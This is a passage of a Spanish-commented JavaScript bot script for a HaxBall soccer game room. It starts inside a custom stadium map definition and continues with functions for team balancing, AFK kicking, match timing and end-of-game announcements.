65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"x":-1150,"y":-570,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"x":1120,"y":600,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"x":1150,"y":570,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"x":1150,"y":-570,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"x":1120,"y":-600,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"x":0,"y":180,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["blueKO"],"trait":"kickOffBarrier","curve":-180},{"x":0,"y":-180,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO"],"trait":"kickOffBarrier","curve":180},{"x":0,"y":180,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO"],"trait":"kickOffBarrier","curve":180},{"x":-1030,"y":-40,"bCoef":-5.7,"cMask":["ball"],"cGroup":["c0"],"trait":"line","curve":70,"color":"576C46","vis":false},{"x":-1030,"y":40,"bCoef":-5.7,"cMask":["ball"],"cGroup":["c0"],"trait":"line","curve":70,"color":"576C46","vis":false},{"x":1030,"y":-40,"bCoef":-5.7,"cMask":["ball"],"cGroup":["c0"],"trait":"line","curve":-70,"color":"576C46","vis":false},{"x":1030,"y":40,"bCoef":-5.7,"cMask":["ball"],"cGroup":["c0"],"trait":"line","curve":-70,"color":"576C46","vis":false},{"x":1030,"y":-40,"trait":"line","color":"576C46"},{"x":1030,"y":40,"trait":"line","color":"576C46"},{"x":-1030,"y":-40,"trait":"line","color":"576C46"},{"x":-1030,"y":40,"trait":"line","color":"576C46"},{"x":0,"y":3,"trait":"line"},{"x":0,"y":-3,"trait":"line"},{"x":-1157,"y":605,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-1157,"y":655,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-1157,"y":-655,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-1157,"y":-605,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":1157,"y":605,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":1157,"y":655,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":1157,"y":-655,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":1157,"y":-605,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-1300,"y":-485,"bCoef":0,"cMask":["c1"],"cGroup":["red","blue"],"color":"ec644b","vis":false},{"x":1300,"y":-485,"bCoef":0,"cMask":["c1"],"cGroup":["red","blue"],"color":"ec644b","vis":false},{"x":-1300,"y":485,"bCoef":0,"cMask":["c1"],"cGroup":["red","blue"],"color":"ec644b","vis":false},{"x":1300,"y":485,"bCoef":0,"cMask":["c1"],"cGroup":["red","blue"],"color":"ec644b","vis":false},{"x":-1295,"y":-320,"cMask":["c0"],"cGroup":["red","blue"]},{"x":-840,"y":-320,"cMask":["c0"],"cGroup":["red","blue"]},{"x":-840,"y":320,"cMask":["c0"],"cGroup":["red","blue"]},{"x":-1295,"y":320,"cMask":["c0"],"cGroup":["red","blue"]},{"x":1295,"y":-320,"cMask":["c0"],"cGroup":["red","blue"]},{"x":840,"y":-320,"cMask":["c0"],"cGroup":["red","blue"]},{"x":840,"y":320,"cMask":["c0"],"cGroup":["red","blue"]},{"x":1295,"y":320,"cMask":["c0"],"cGroup":["red","blue"]},{"x":-1150,"y":-124,"bCoef":0,"cMask":["ball","red","blue"]},{"x":-1210,"y":-124,"bCoef":0,"cMask":["ball"],"bias":0,"curve":5},{"x":-1150,"y":124,"bCoef":0,"cMask":["ball","red","blue"]},{"x":-1210,"y":124,"bCoef":0,"cMask":["ball"],"bias":0,"curve":5},{"x":-1250,"y":-158,"bCoef":0,"cMask":["ball"]},{"x":-1250,"y":158,"bCoef":0,"cMask":["ball"]},{"x":1150,"y":124,"bCoef":0,"cMask":["ball","red","blue"]},{"x":1210,"y":124,"bCoef":0,"cMask":["ball"],"curve":-5},{"x":1150,"y":-124,"bCoef":0,"cMask":["ball","red","blue"]},{"x":1210,"y":-124,"bCoef":0,"cMask":["ball"],"curve":-5},{"x":1250,"y":-158,"bCoef":0,"cMask":["ball"]},{"x":1250,"y":158,"bCoef":0,"cMask":["ball"]}],"segments":[{"v0":0,"v1":1,"trait":"kickOffBarrier"},{"v0":2,"v1":3,"trait":"kickOffBarrier"},{"v0":4,"v1":5,"trait":"line","y":320},{"v0":5,"v1":7,"trait":"line","x":840},{"v0":6,"v1":7,"trait":"line","y":-320},{"v0":8,"v1":9,"trait":"line","y":180},{"v0":9,"v1":11,"trait":"line","x":1030},{"v0":10,"v1":11,"trait":"line","y":-180},{"v0":12,"v1":13,"curve":-130,"trait":"line","x":840},{"v0":14,"v1":15,"trait":"line","y":-320},{"v0":15,"v1":17,"trait":"line","x":-840},{"v0":16,"v1":17,"trait":"line","y":320},{"v0":18,"v1":19,"trait":"line","y":-175},{"v0":19,"v1":21,"trait":"line","x":-1030},{"v0":20,"v1":21,"trait":"line","y":175},{"v0":22,"v1":23,"curve":-130,"trait":"line","x":-840},{"v0":24,"v1":25,"curve":-180,"trait":"line","x":935},{"v0":26,"v1":27,"curve":-180,"trait":"line","x":-935},{"v0":24,"v1":25,"curve":180,"trait":"line","x":935},{"v0":26,"v1":27,"curve":180,"trait":"line","x":-935},{"v0":24,"v1":25,"curve":90,"trait":"line","x":935},{"v0":26,"v1":27,"curve":90,"trait":"line","x":-935},{"v0":24,"v1":25,"curve":-90,"trait":"line","x":935},{"v0":26,"v1":27,"curve":-90,"trait":"line","x":-935},{"v0":24,"v1":25,"trait":"line","x":935},{"v0":26,"v1":27,"trait":"line","x":-935},{"v0":28,"v1":29,"curve":90,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"v0":30,"v1":31,"curve":90,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"v0":32,"v1":33,"curve":90,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"v0":34,"v1":35,"curve":90,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"v0":37,"v1":36,"curve":-180,"vis":false,"bCoef":0.1,"cGroup":["blueKO"],"trait":"kickOffBarrier"},{"v0":39,"v1":40,"curve":70,"vis":false,"color":"576C46","bCoef":-5.7,"cMask":["ball"],"cGroup":["c0"],"trait":"line","x":-1030},{"v0":41,"v1":42,"curve":-70,"vis":false,"color":"576C46","bCoef":-5.7,"cMask":["ball"],"cGroup":["c0"],"trait":"line","x":1030},{"v0":37,"v1":38,"curve":180,"vis":false,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO"],"trait":"kickOffBarrier"},{"v0":43,"v1":44,"vis":true,"color":"576C46","trait":"line","x":1030},{"v0":45,"v1":46,"vis":true,"color":"576C46","trait":"line","x":-1030},{"v0":47,"v1":48,"curve":-180,"trait":"line","x":-935},{"v0":47,"v1":48,"curve":180,"trait":"line","x":-935},{"v0":47,"v1":48,"curve":90,"trait":"line","x":-935},{"v0":47,"v1":48,"curve":-90,"trait":"line","x":-935},{"v0":47,"v1":48,"trait":"line","x":-935},{"v0":49,"v1":50,"color":"FFFF00","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":-1157},{"v0":51,"v1":52,"color":"FFFF00","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":-1157},{"v0":53,"v1":54,"color":"FFFF00","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":1157},{"v0":55,"v1":56,"color":"FFFF00","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":1157},{"v0":57,"v1":58,"vis":false,"color":"ec644b","bCoef":0,"cMask":["c1"],"cGroup":["red","blue"],"y":-485},{"v0":59,"v1":60,"vis":false,"color":"ec644b","bCoef":0,"cMask":["c1"],"cGroup":["red","blue"],"y":485},{"v0":61,"v1":62,"vis":false,"color":"ec644b","cMask":["c0"],"cGroup":["red","blue"]},{"v0":62,"v1":63,"vis":false,"color":"ec644b","cMask":["c0"],"cGroup":["red","blue"]},{"v0":63,"v1":64,"vis":false,"color":"ec644b","cMask":["c0"],"cGroup":["red","blue"]},{"v0":65,"v1":66,"vis":false,"cMask":["c0"],"cGroup":["red","blue"]},{"v0":66,"v1":67,"vis":false,"cMask":["c0"],"cGroup":["red","blue"]},{"v0":67,"v1":68,"vis":false,"cMask":["c0"],"cGroup":["red","blue"]},{"v0":69,"v1":70,"color":"FFFFFF","bCoef":0,"cMask":["ball","red","blue"],"y":-124},{"v0":71,"v1":72,"color":"FFFFFF","bCoef":0,"cMask":["ball","red","blue"],"y":124},{"v0":72,"v1":70,"curve":5,"color":"FFFFFF","bCoef":0,"cMask":["ball","red","blue"],"bias":0},{"v0":70,"v1":73,"color":"FFFFFF","bCoef":0,"cMask":["ball"]},{"v0":72,"v1":74,"color":"FFFFFF","bCoef":0,"cMask":["ball"]},{"v0":75,"v1":76,"color":"FFFFFF","bCoef":0,"cMask":["ball","red","blue"],"y":124},{"v0":77,"v1":78,"color":"FFFFFF","bCoef":0,"cMask":["ball","red","blue"],"y":-124},{"v0":76,"v1":78,"curve":-5,"color":"FFFFFF","bCoef":0,"cMask":["ball","red","blue"]},{"v0":78,"v1":79,"color":"FFFFFF","bCoef":0,"cMask":["ball"]},{"v0":76,"v1":80,"color":"FFFFFF","bCoef":0,"cMask":["ball"]}],"goals":[{"p0":[-1162.45,124],"p1":[-1162.45,-124],"team":"red"},{"p0":[1162.45,124],"p1":[1162.45,-124],"team":"blue","radius":0,"invMass":1}],"discs":[{"radius":0,"invMass":0,"pos":[-1311,-19],"color":"ffffffff","bCoef":0,"cMask":["red"],"cGroup":["ball"]},{"radius":0,"invMass":0,"pos":[-1310,29],"color":"ffffffff","bCoef":0,"cMask":["blue"],"cGroup":["ball"]},{"radius":0,"invMass":0,"pos":[-1308,62],"color":"ffffffff","bCoef":0,"cMask":["red","blue"],"cGroup":["ball"]},{"radius":2.7,"pos":[-1150,600],"cGroup":["ball"],"trait":"cornerflag"},{"radius":2.7,"pos":[1150,-600],"cGroup":["ball"],"trait":"cornerflag"},{"radius":2.7,"pos":[1150,600],"cGroup":["ball"],"trait":"cornerflag"},{"radius":5,"invMass":0,"pos":[-1150,-124],"bCoef":0.5,"trait":"goalPost"},{"radius":5,"invMass":0,"pos":[-1150,124],"bCoef":0.5,"trait":"goalPost"},{"radius":2,"invMass":0,"pos":[-1250,-158],"color":"000000","bCoef":1,"trait":"goalPost"},{"radius":2,"invMass":0,"pos":[-1250,158],"color":"000000","bCoef":1,"trait":"goalPost"},{"radius":5,"invMass":0,"pos":[1150,-124],"bCoef":0.5,"trait":"goalPost"},{"radius":5,"invMass":0,"pos":[1150,124],"bCoef":0.5,"trait":"goalPost"},{"radius":2,"invMass":0,"pos":[1250,-158],"color":"000000","bCoef":1,"trait":"goalPost"},{"radius":2,"invMass":0,"pos":[1250,158],"color":"000000","bCoef":1,"trait":"goalPost"},{"radius":2.7,"pos":[-1150,-600],"cGroup":["ball"],"trait":"cornerflag"},{"radius":0,"pos":[-1149,-485],"cMask":["none"]},{"radius":0,"pos":[1149,-485],"cMask":["none"]},{"radius":0,"pos":[-1149,-485],"cMask":["none"]},{"radius":0,"pos":[1149,-485],"cMask":["none"]},{"radius":0,"pos":[-1149,485],"cMask":["none"]},{"radius":0,"pos":[1149,485],"cMask":["none"]},{"radius":0,"pos":[-1149,485],"cMask":["none"]},{"radius":0,"pos":[1149,485],"cMask":["none"]}],"planes":[{"normal":[0,1],"dist":-627,"bCoef":0,"cGroup":["ball"],"trait":"ballArea","_data":{"extremes":{"normal":[0,1],"dist":-627,"canvas_rect":[-1311,-675,1300,675],"a":[-1311,-627],"b":[1300,-627]}}},{"normal":[0,-1],"dist":-627,"bCoef":0,"cGroup":["ball"],"trait":"ballArea","_data":{"extremes":{"normal":[0,-1],"dist":-627,"canvas_rect":[-1311,-675,1300,675],"a":[-1311,627],"b":[1300,627]},"mirror":{}}},{"normal":[0,1],"dist":-670,"bCoef":0,"_data":{"extremes":{"normal":[0,1],"dist":-670,"canvas_rect":[-1311,-675,1300,675],"a":[-1311,-670],"b":[1300,-670]},"mirror":{}}},{"normal":[0,-1],"dist":-670,"bCoef":0,"_data":{"extremes":{"normal":[0,-1],"dist":-670,"canvas_rect":[-1311,-675,1300,675],"a":[-1311,670],"b":[1300,670]},"mirror":{}}},{"normal":[1,0],"dist":-1300,"bCoef":0,"_data":{"extremes":{"normal":[1,0],"dist":-1300,"canvas_rect":[-1311,-675,1300,675],"a":[-1300,-675],"b":[-1300,675]}}},{"normal":[-1,0],"dist":-1300,"bCoef":0.1,"_data":{"extremes":{"normal":[-1,0],"dist":-1300,"canvas_rect":[-1311,-675,1300,675],"a":[1300,-675],"b":[1300,675]}}},{"normal":[1,0],"dist":-1230,"bCoef":0,"cMask":["ball"],"cGroup":["ball"],"_data":{"extremes":{"normal":[1,0],"dist":-1230,"canvas_rect":[-1311,-675,1300,675],"a":[-1230,-675],"b":[-1230,675]}}},{"normal":[-1,0],"dist":-1230,"bCoef":0,"cMask":["ball"],"cGroup":["ball"],"_data":{"extremes":{"normal":[-1,0],"dist":-1230,"canvas_rect":[-1311,-675,1300,675],"a":[1230,-675],"b":[1230,675]}}}],"traits":{"ballArea":{"vis":false,"bCoef":0,"cMask":["ball"],"cGroup":["ball"]},"goalPost":{"radius":5,"invMass":0,"bCoef":1,"cGroup":["ball"]},"rightNet":{"radius":0,"invMass":1,"bCoef":0,"cGroup":["ball","c3"]},"leftNet":{"radius":0,"invMass":1,"bCoef":0,"cGroup":["ball","c2"]},"stanchion":{"radius":3,"invMass":0,"bCoef":3,"cMask":["none"]},"cornerflag":{"radius":3,"invMass":0,"bCoef":0.2,"color":"FFFF00","cMask":["ball"]},"reargoalNetleft":{"vis":true,"bCoef":0.1,"cMask":["ball","red","blue"],"curve":10,"color":"C7E6BD"},"reargoalNetright":{"vis":true,"bCoef":0.1,"cMask":["ball","red","blue"],"curve":-10,"color":"C7E6BD"},"sidegoalNet":{"vis":true,"bCoef":1,"cMask":["ball","red","blue"],"color":"C7E6BD"},"kickOffBarrier":{"vis":false,"bCoef":0.1,"cGroup":["redKO","blueKO"],"cMask":["red","blue"]},"line":{"vis":true,"cMask":[],"color":"C7E6BD"}},"joints":[{"d0":16,"d1":17,"strength":"rigid","color":"ec7458","length":null},{"d0":18,"d1":19,"strength":"rigid","color":"48bef9","length":null},{"d0":20,"d1":21,"strength":"rigid","color":"ec7458","length":null},{"d0":22,"d1":23,"strength":"rigid","color":"48bef9","length":null}],"redSpawnPoints":[],"blueSpawnPoints":[],"canBeStored":false}';

// Opciones

var afkLimit = 13;
var drawTimeLimit = Infinity;
var maxTeamSize = 4;
var slowMode = 0;

// Jugadores

const Team = { SPECTATORS: 0, RED: 1, BLUE: 2 };
var extendedP = [];
const eP = { ID: 0, AUTH: 1, CONN: 2, AFK: 3, ACT: 4, GK: 5, MUTE: 6 };
const Ss = { GA: 0, WI: 1, DR: 2, LS: 3, WR: 4, GL: 5, AS: 6, GK: 7, CS: 8, CP: 9, RL: 10, NK: 11};
var players;
var teamR;
var teamB;
var teamS;

// Juego

var lastTeamTouched;
var lastPlayersTouched;
var countAFK = false;
var activePlay = false;
var goldenGoal = false;
var SMSet = new Set();
var banList = [];

// Estadisticas

var GKList = ["",""];
var Rposs = 0;
var Bposs = 0;
var point = [{"x": 0, "y": 0}, {"x": 0, "y": 0}];
var ballSpeed;
var lastWinner = Team.SPECTATORS;
var streak = 0;
var allBlues = [];
var allReds = [];

// Apoyo | Balance && Escoger equipos

var inChooseMode = false;
var redCaptainChoice = "";
var blueCaptainChoice = "";
var chooseTime = 20;
var timeOutCap;

// Auxiliar

var checkTimeVariable = false;
var statNumber = 0;
var endGameVariable = false;
var resettingTeams = false;
var capLeft = false;
var statInterval = 6;

loadMap(mapaSolo, 0, 0);

// Objetos

function Goal(time, team, striker, assist) {
	this.time = time;
	this.team = team;
	this.striker = striker;
	this.assist = assist;
}

function getRandomInt(max) { 
	return Math.floor(Math.random() * Math.floor(max)); 
}

function getTime(scores) {
	return "[" + Math.floor(Math.floor(scores.time/60)/10).toString() + Math.floor(Math.floor(scores.time/60)%10).toString() + ":" + Math.floor(Math.floor(scores.time - (Math.floor(scores.time/60) * 60))/10).toString() + Math.floor(Math.floor(scores.time - (Math.floor(scores.time/60) * 60))%10).toString() + "]"
}

function pointDistance(p1, p2) {
	var d1 = p1.x - p2.x;
	var d2 = p1.y - p2.y;
	return Math.sqrt(d1 * d1 + d2 * d2);
}

function sendMsgAll(msg, color, style, sound) {
	for(let player = 0; player < room.getPlayerList().length; player++) {
		room.sendAnnouncement(msg, room.getPlayerList()[player].id, color, style, sound);
	}
}

// Funciones | Escojer equipos && Partidas

function topBtn() {
	if (teamS.length == 0) {
		return;
	}
	else {
		if (teamR.length == teamB.length) {
			if (teamS.length > 1) {
				room.setPlayerTeam(teamS[0].id, Team.RED);
				room.setPlayerTeam(teamS[1].id, Team.BLUE);
			}
			return;
		}
		else if (teamR.length < teamB.length) {
			room.setPlayerTeam(teamS[0].id, Team.RED);
		}
		else {
			room.setPlayerTeam(teamS[0].id, Team.BLUE);
		}
	}
}

function randomBtn() {
	if (teamS.length == 0) {
		return;
	}
	else {
		if (teamR.length == teamB.length) {
			if (teamS.length > 1) {
				var r = getRandomInt(teamS.length);
				room.setPlayerTeam(teamS[r].id, Team.RED);
				teamS = teamS.filter((spec) => spec.id != teamS[r].id);
				room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
			}
			return;
		}
		else if (teamR.length < teamB.length) {
			room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.RED);
		}
		else {
			room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
		}
	}
}

function blueToSpecBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	for (var i = 0; i < teamB.length; i++) {
		room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
	}
}

function redToSpecBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	for (var i = 0; i < teamR.length; i++) {
		room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
	}
}

function resetBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	if (teamR.length <= teamB.length) {
		for (var i = 0; i < teamR.length; i++) {
			room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
			room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
		}
		for (var i = teamR.length; i < teamB.length; i++) {
			room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
		}
	}
	else {
		for (var i = 0; i < teamB.length; i++) {
			room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
			room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
		}
		for (var i = teamB.length; i < teamR.length; i++) {
			room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
		}
	}
}

function blueToRedBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	for (var i = 0; i < teamB.length; i++) {
		room.setPlayerTeam(teamB[i].id, Team.RED);
	}
}

// Funciones | Juego

function checkTime() {
	const scores = room.getScores();
	game.scores = scores;
	if (Math.abs(scores.time - scores.timeLimit) <= 0.01 && scores.timeLimit != 0) {
		if (scores.red != scores.blue) {
			if (checkTimeVariable == false) {
				checkTimeVariable = true;
				setTimeout(() => { checkTimeVariable = false; }, 3000);
				scores.red > scores.blue ? endGame(Team.RED) : endGame(Team.BLUE);
				setTimeout(() => { room.stopGame(); }, 2000);
			}
			return;
		}
		goldenGoal = true;
		sendMsgAll("⚽ Gol de ORO!", 0xffff00, "bold", 1);
	}
	if (Math.abs(drawTimeLimit * 60 - scores.time - 60) <= 0.01 && players.length > 2) {
		if (checkTimeVariable == false) {
			checkTimeVariable = true;
			setTimeout(() => { checkTimeVariable = false; }, 10);
			sendMsgAll("⌛ El partido culminará en 60 segundos...", 0xffff00, "bold", 1);
			if(scores.red > scores.blue) sendMsgAll("Parece que el equipo ROJO va ganando...", 0xFF7575, "normal", 0);
			if(scores.blue > scores.red) sendMsgAll("Parece que el equipo AZUL va ganando...", 0x6EA5FF, "normal", 0);
			if(scores.red == scores.blue) sendMsgAll("¡El partido sigue en el empate!", 0xFFFF00, "normal", 0);
		}
	}
	if (Math.abs(scores.time - drawTimeLimit * 60) <= 0.01 && players.length > 2) {
		if (checkTimeVariable == false) {
			checkTimeVariable = true;
			setTimeout(() => { checkTimeVariable = false; }, 10);
			endGame(Team.SPECTATORS);
			room.stopGame();
			goldenGoal = false;
		}
	}
}

function endGame(winner) { // handles the end of a game : no stopGame function inside
	players.length >= 2 * maxTeamSize - 1 ? activateChooseMode() : null;
	const scores = room.getScores();
	game.scores = scores;
	Rposs = Rposs/(Rposs+Bposs);
	Bposs = 1 - Rposs;
	lastWinner = winner;
	endGameVariable = true;
	if (winner == Team.RED) {
		gkBlue = 0
		streak++;
		sendMsgAll("🔴 ¡El Equipo ROJO se lleva la victoria con un " + scores.red + " - " + scores.blue + "!  🏆 𝗟𝗹𝗲𝘃𝗮𝗻 𝘂𝗻𝗮 𝗿𝗮𝗰𝗵𝗮 𝗱𝗲 " + streak + " 𝘃𝗶𝗰𝘁𝗼𝗿𝗶𝗮𝘀.", 0xFF7575, "bold", 1);
	}
	else if (winner == Team.BLUE) {
		streak = 1;
		sendMsgAll("🔵 ¡El Equipo AZUL se lleva la victoria con un " + scores.blue + " - " + scores.red + "!  🏆 𝗟𝗹𝗲𝘃𝗮𝗻 𝘂𝗻𝗮 𝗿𝗮𝗰𝗵𝗮 𝗱𝗲 " + streak + " 𝘃𝗶𝗰𝘁𝗼𝗿𝗶𝗮𝘀.", 0x6EA5FF, "bold", 1);
	}
	else {
		streak = 0;
		sendMsgAll("💤 Empate, ¡Juego terminado! 💤", 0xffff00, "bold", 1);
    }
    sendMsgAll("📊 Posesión del balón:  🔴 " + (Rposs*100).toPrecision(3).toString() + "%  —  " + (Bposs*100).toPrecision(3).toString() + "% 🔵", 0xF7B0FF, "bold", 1);
	scores.red == 0 ? (scores.blue == 0 ? sendMsgAll("🏆 " + GKList[0].name + " y " + GKList[1].name + " mantuvieron la valla invicta!", 0xFF9500, "bold", 1) : sendMsgAll("🥅 " + GKList[1].name + " 𝗺𝗮𝗻𝘁𝘂𝘃𝗼 𝗹𝗮 𝘃𝗮𝗹𝗹𝗮 𝗶𝗻𝘃𝗶𝗰𝘁𝗮!", 0x30CCA1, "bold", 1)) : scores.blue == 0 ? sendMsgAll("🥅 " + GKList[0].name + " 𝗺𝗮𝗻𝘁𝘂𝘃𝗼 𝗹𝗮 𝘃𝗮𝗹𝗹𝗮 𝗶𝗻𝘃𝗶𝗰𝘁𝗮!", 0x30CCA1, "bold", 1) : null;
	updateStats();
}

function quickRestart() {
	room.stopGame();
	setTimeout(() => { room.startGame(); }, 2000);
}

function resumeGame() {
	setTimeout(() => { room.startGame(); }, 2000);
	setTimeout(() => { room.pauseGame(false); }, 1000);
}

function activateChooseMode() {
	inChooseMode = true;
	slowMode = 2;
        room.sendChat("Modo lento de 2 segundos activado !");
}

function deactivateChooseMode() {
	inChooseMode = false;
	clearTimeout(timeOutCap);
	if (slowMode != 0) {
		slowMode = 0;
                room.sendChat("Modo lento desactivado.");
	}
	redCaptainChoice = "";
	blueCaptainChoice = "";
}

function loadMap(map, scoreLim, timeLim) {
	if (map == mapaSolo) {
		map = "custom";
		room.setCustomStadium(mapaSolo);
	}
	else if (map == getRealSoccerMap) {
		map = "RSR";
		room.setCustomStadium(getRealSoccerMap);
	}
	else if (map == mapa1vs1_2vs2) {
		map = "RSR";
		room.setCustomStadium(getRealSoccerMap);
		//room.setDefaultStadium("Classic");
	}
	else if (map == mapa4vs4Azul) {
		map = "RSR";
		room.setCustomStadium(getRealSoccerMap);
	}
	else if (map == mapa4vs4Gris) {
		map = "RSR";
		room.setCustomStadium(getRealSoccerMap);
	}
	else {
		room.setCustomStadium(map);
	}
	room.setScoreLimit(scoreLim);
	room.setTimeLimit(timeLim);
}

// Funciones | Jugadores

function updateTeams() {
	players = room.getPlayerList().filter((player) => player.id != 0 && !getAFK(player));
	teamR = players.filter(p => p.team === Team.RED);
	teamB = players.filter(p => p.team === Team.BLUE);
	teamS = players.filter(p => p.team === Team.SPECTATORS);
}

function handleInactivity() {
	if (countAFK && (teamR.length + teamB.length) > 1) {
		for (var i = 0; i < teamR.length ; i++) {
			setActivity(teamR[i], getActivity(teamR[i]) + 1);
		}
		for (var i = 0; i < teamB.length ; i++) {
			setActivity(teamB[i], getActivity(teamB[i]) + 1);
		}
	}
	for (var i = 0; i < extendedP.length ; i++) {
		if (extendedP[i][eP.ACT] == 60 * (2/3 * afkLimit)) {
			room.sendAnnouncement("[⛔] @" + room.getPlayer(extendedP[i][eP.ID]).name + ", ¿Estás AFK? Porque en " + Math.floor(afkLimit / 3) + " segundos ¡Serás kickeado!", extendedP[i][eP.ID], 0x00FFE0, "bold", 2);
		}
		if (extendedP[i][eP.ACT] >= 60 * afkLimit) {
			extendedP[i][eP.ACT] = 0;
            if (room.getScores().time <= afkLimit - 0.5) {
				setTimeout(() => { !inChooseMode ? quickRestart() : room.stopGame(); }, 10);
			}
			room.kickPlayer(extendedP[i][eP.ID], "AFK en la cancha por más de " + Math.floor(afkLimit / 3) + " segundos!", false);
		}	
	}
}

function getAuth(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.AUTH] : null;
}

function getAFK(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.AFK] : null;
}

function setAFK(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.AFK] = value);
}

function getActivity(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.ACT] : null;
}

function setActivity(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.ACT] = value);
}

function getGK(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.GK] : null;
}

function setGK(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.GK] = value);
}

function getMute(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.MUTE] : null;
}

function setMute(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.MUTE] = value);
}

// Funciones | Balance && Escoger jugadores (2)

function updateRoleOnPlayerIn() {
	updateTeams();
	if (inChooseMode) {
		if (players.length == 6) {
			map = "RSR"
			loadMap(getRealSoccerMap, goles_mapa4vs4, tiempo_mapa4vs4);
		}
		getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
	}
	balanceTeams();
}

function updateRoleOnPlayerOut() {
    updateTeams();
	if (room.getScores() != null) {
		var scores = room.getScores();
		if (players.length >= 2 * maxTeamSize && scores.time >= (5/6) * game.scores.timeLimit && teamR.length != teamB.length) {
			if (teamR.length < teamB.length) {
				if (scores.blue - scores.red == 2) {
					endGame(Team.BLUE);
					sendMsgAll("🤖 Abandono detectado, juego terminado 🤖", 0xFF7575, "bold", 1);
					setTimeout(() => { room.stopGame(); }, 100);
					return;
				}
			}
			else {
				if (scores.red - scores.blue == 2) {
					endGame(Team.RED); 
					sendMsgAll("🤖 Abandono detectado, juego terminado 🤖", 0x6EA5FF, "bold", 1);
					setTimeout(() => { room.stopGame(); }, 100);
					return;
				}
			}
		}
	}
	if (inChooseMode) {
		if (players.length == 5) {
			map = "RSR"
			loadMap(getRealSoccerMap, goles_mapaSolo, goles_mapaSolo);
		}
		if (teamR.length == 0 || teamB.length == 0) {
			teamR.length == 0 ? room.setPlayerTeam(teamS[0].id, Team.RED) : room.setPlayerTeam(teamS[0].id, Team.BLUE);
			return;
		}
		if (Math.abs(teamR.length - teamB.length) == teamS.length) {
			sendMsgAll("No hay alternativa, déjame manejar esta situación...", 0xFFFF00, "bold", 1);
			deactivateChooseMode();
			resumeGame();
			var b = teamS.length;
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.BLUE); }, 5*i);
				}
			}
			else {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.RED); }, 5*i);
				}
			}
			return;
		}
		if (streak == 0 && room.getScores() == null) {
			if (Math.abs(teamR.length - teamB.length) == 2) {
				sendMsgAll("🤖 Equilibrando equipos... 🤖", 0xFFFF00, "bold", 1);
				teamR.length > teamB.length ? room.setPlayerTeam(teamR[teamR.length - 1].id, Team.SPECTATORS) : room.setPlayerTeam(teamB[teamB.length - 1].id, Team.SPECTATORS);
			}
		}
		if (teamR.length == teamB.length && teamS.length < 2) {
			deactivateChooseMode();
			resumeGame();
			return;
		}
		capLeft ? choosePlayer() : getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
	}
	balanceTeams();
}

function balanceTeams() {
	if (!inChooseMode) {
		if (players.length == 1 && teamR.length == 0) {
            quickRestart();
			map = "RSR"
            loadMap(mapaSolo, 0, 0);
			room.setPlayerTeam(players[0].id, Team.RED);
		}
